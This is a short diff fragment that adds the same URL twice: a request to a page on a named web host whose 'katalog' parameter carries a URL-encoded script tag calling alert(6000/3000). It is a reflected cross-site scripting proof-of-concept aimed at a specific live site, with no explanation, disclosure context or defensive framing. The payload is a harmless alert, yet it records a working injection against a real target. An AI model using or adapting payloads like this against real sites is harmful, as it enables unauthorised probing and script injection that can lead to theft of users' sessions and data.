@@ -1,0 +1,4 @@
+http://katalog.szulborze.wlk.e-bp.eu/ini.php?katalog=%3Cscript%3Ealert(6000/3000)%3C/script%3E
+
+http://katalog.szulborze.wlk.e-bp.eu/ini.php?katalog=%3Cscript%3Ealert(6000/3000)%3C/script%3E
+
